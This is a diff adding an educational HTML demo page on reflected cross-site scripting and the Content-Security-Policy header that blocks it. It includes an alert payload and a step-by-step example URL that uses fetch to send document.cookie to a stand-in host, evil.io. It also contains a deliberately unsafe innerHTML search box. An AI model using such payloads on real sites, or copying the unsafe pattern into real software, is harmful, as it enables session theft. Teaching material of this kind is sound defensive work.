@@ -1,0 +1,166 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>XSS — Missing Content-Security-Policy</title>
+  <style>
+    :root { --dark:#1a1a2e; --card:#16213e; --red:#e74c3c; --green:#27ae60; --text:#eaeaea; --muted:#8899aa; }
+    * { box-sizing:border-box; margin:0; padding:0; }
+    body { font-family:'Segoe UI',system-ui,sans-serif; background:var(--dark); color:var(--text); line-height:1.6; }
+    header { background:linear-gradient(135deg,#6c0c0c,#c0392b); padding:2rem; border-bottom:3px solid var(--red); }
+    header h1 { font-size:1.8rem; }
+    header .sub { color:#ffcccc; font-size:0.9rem; margin-top:0.3rem; }
+    nav { padding:0.7rem 2rem; background:#0f1f3a; font-size:0.85rem; }
+    nav a { color:#aac4ff; text-decoration:none; }
+    nav a:hover { text-decoration:underline; }
+    main { max-width:860px; margin:2rem auto; padding:0 1.5rem; display:flex; flex-direction:column; gap:2rem; }
+    .panel {
+      background:var(--card); border:1px solid #2a3a5c; border-radius:10px; padding:1.5rem;
+    }
+    .panel.attack { border-left:4px solid var(--red); }
+    .panel.fix    { border-left:4px solid var(--green); }
+    .panel h2 { font-size:1.1rem; margin-bottom:1rem; }
+    .panel.attack h2 { color:var(--red); }
+    .panel.fix h2    { color:var(--green); }
+    p { font-size:0.92rem; color:var(--muted); margin-bottom:0.8rem; }
+    code, pre {
+      font-family:'Fira Code',monospace; font-size:0.85rem;
+      background:#0f1f3a; color:#82c4f8;
+    }
+    pre {
+      padding:1rem; border-radius:6px; overflow-x:auto;
+      white-space:pre; border:1px solid #1e3a5a; margin:0.8rem 0;
+    }
+    code { padding:0.1rem 0.4rem; border-radius:3px; }
+    .demo-area {
+      background:#0b1629; border:1px dashed #4a6fa5; border-radius:6px; padding:1rem; margin-top:1rem;
+    }
+    .demo-area label { font-size:0.85rem; color:#aac4ff; display:block; margin-bottom:0.5rem; }
+    .demo-area input {
+      width:100%; padding:0.5rem 0.7rem; background:#16213e; border:1px solid #2a3a5c;
+      border-radius:4px; color:var(--text); font-size:0.9rem;
+    }
+    .demo-area button {
+      margin-top:0.6rem; padding:0.5rem 1.2rem;
+      background:var(--red); border:none; border-radius:4px;
+      color:#fff; cursor:pointer; font-size:0.85rem;
+    }
+    .demo-area button:hover { background:#c0392b; }
+    #output {
+      margin-top:0.8rem; padding:0.6rem; background:#16213e;
+      border:1px solid #2a3a5c; border-radius:4px; min-height:2rem;
+      font-size:0.9rem;
+    }
+    ol { padding-left:1.5rem; }
+    ol li { font-size:0.88rem; color:var(--muted); margin-bottom:0.5rem; }
+    .header-block {
+      background:#0b1629; border:1px solid var(--green); border-radius:6px;
+      padding:1rem; font-family:monospace; font-size:0.85rem; color:#82f8a4;
+      margin:0.8rem 0;
+    }
+    .step-num {
+      display:inline-block; background:var(--red); color:#fff;
+      width:1.4rem; height:1.4rem; border-radius:50%; text-align:center;
+      line-height:1.4rem; font-size:0.75rem; font-weight:700; margin-right:0.5rem;
+    }
+    .step-num.fix { background:var(--green); }
+    footer { text-align:center; margin:2rem 0 1rem; color:var(--muted); font-size:0.8rem; }
+  </style>
+</head>
+<body>
+<header>
+  <h1>💉 Cross-Site Scripting (XSS)</h1>
+  <div class="sub">Missing header: <code style="background:rgba(0,0,0,0.3);padding:0.1rem 0.4rem;border-radius:3px">Content-Security-Policy</code></div>
+</header>
+<nav><a href="index.html">← Back to all demos</a></nav>
+
+<main>
+
+  <!-- WHAT IS XSS -->
+  <div class="panel">
+    <h2>📖 What is XSS?</h2>
+    <p>Cross-Site Scripting (XSS) occurs when an attacker injects malicious JavaScript into a page that other users visit. Because the script runs in the victim's browser under the site's origin, it can:</p>
+    <ul style="padding-left:1.5rem;color:var(--muted);font-size:0.9rem;margin-bottom:0.5rem">
+      <li>Steal <code>document.cookie</code> (session tokens)</li>
+      <li>Capture keystrokes and form data</li>
+      <li>Redirect the user to a phishing site</li>
+      <li>Silently perform actions on behalf of the user</li>
+    </ul>
+    <p><strong>Without Content-Security-Policy</strong>, the browser has no whitelist of trusted script sources — any injected script runs freely.</p>
+  </div>
+
+  <!-- LIVE DEMO -->
+  <div class="panel attack">
+    <h2>🔴 Live Demo — Reflected XSS</h2>
+    <p>This search box naively renders whatever you type as HTML. Normally a server would do this; here the client reproduces the pattern so you can experiment safely in your own browser.</p>
+    <p>Try pasting the payload below into the box and clicking Search:</p>
+    <pre>&lt;img src=x onerror="alert('XSS: cookie=' + document.cookie)"&gt;</pre>
+    <p>Because there is <strong>no CSP</strong>, the event handler fires and the alert pops. In a real attack the payload exfiltrates the cookie to an attacker-controlled server instead.</p>
+
+    <div class="demo-area">
+      <label for="search">Search this site:</label>
+      <input id="search" type="text" placeholder='Try: &lt;img src=x onerror="alert(1)"&gt;' />
+      <button onclick="reflect()">Search</button>
+      <div id="output">Results will appear here…</div>
+    </div>
+  </div>
+
+  <!-- STEP-BY-STEP ATTACK -->
+  <div class="panel attack">
+    <h2>🔴 How the Attack Works — Step by Step</h2>
+    <ol>
+      <li><span class="step-num">1</span>Attacker finds a page that reflects user input into the DOM without sanitisation (search pages, error messages, URL parameters).</li>
+      <li><span class="step-num">2</span>Attacker crafts a URL containing a malicious payload, e.g.:<br>
+        <pre>https://vulnerable.example/?q=&lt;script&gt;fetch('https://evil.io/steal?c='+document.cookie)&lt;/script&gt;</pre>
+      </li>
+      <li><span class="step-num">3</span>Victim clicks the link (or attacker tricks them via email / social media).</li>
+      <li><span class="step-num">4</span>Server echoes the payload back in the HTML response; browser parses and executes it.</li>
+      <li><span class="step-num">5</span>Attacker's server receives the victim's session cookie and hijacks the account.</li>
+    </ol>
+    <p style="margin-top:0.8rem"><strong>Stored XSS</strong> is worse: the payload is saved in the database (a comment, profile field) and fires for every visitor without any crafted URL.</p>
+  </div>
+
+  <!-- THE FIX -->
+  <div class="panel fix">
+    <h2>✅ The Fix — Content-Security-Policy</h2>
+    <p>Add this response header to tell the browser which sources it may load scripts from. Even if an attacker injects a <code>&lt;script&gt;</code> tag, the browser refuses to run it unless the source matches the policy.</p>
+
+    <div class="header-block">
+      Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'self';
+    </div>
+
+    <p>What each directive does:</p>
+    <ul style="padding-left:1.5rem;color:var(--muted);font-size:0.88rem">
+      <li><code>default-src 'self'</code> — only load resources from the same origin by default.</li>
+      <li><code>script-src 'self'</code> — scripts must come from the same origin; inline <code>&lt;script&gt;</code> blocks and <code>onerror=</code> attributes are blocked.</li>
+      <li><code>object-src 'none'</code> — disallow Flash/plugin content entirely.</li>
+      <li><code>base-uri 'self'</code> — prevent attackers from hijacking relative URLs with <code>&lt;base&gt;</code> injection.</li>
+    </ul>
+
+    <p style="margin-top:0.8rem">In Nginx:</p>
+    <pre>add_header Content-Security-Policy "default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'self';" always;</pre>
+
+    <p>For apps that need inline scripts, use a <strong>nonce</strong> instead of <code>'unsafe-inline'</code>:</p>
+    <pre>&lt;!-- Server generates a random nonce per request --&gt;
+Content-Security-Policy: script-src 'nonce-abc123XYZ'
+
+&lt;script nonce="abc123XYZ"&gt;
+  // your legitimate inline script
+&lt;/script&gt;</pre>
+    <p>Attacker-injected scripts have no nonce and are blocked even if they are inline.</p>
+  </div>
+
+</main>
+
+<footer>Educational demo — do not use in production.</footer>
+
+<script>
+function reflect() {
+  const val = document.getElementById('search').value;
+  // Deliberately unsafe innerHTML — this is the vulnerability being demonstrated
+  document.getElementById('output').innerHTML = 'You searched for: ' + val;
+}
+</script>
+</body>
+</html>
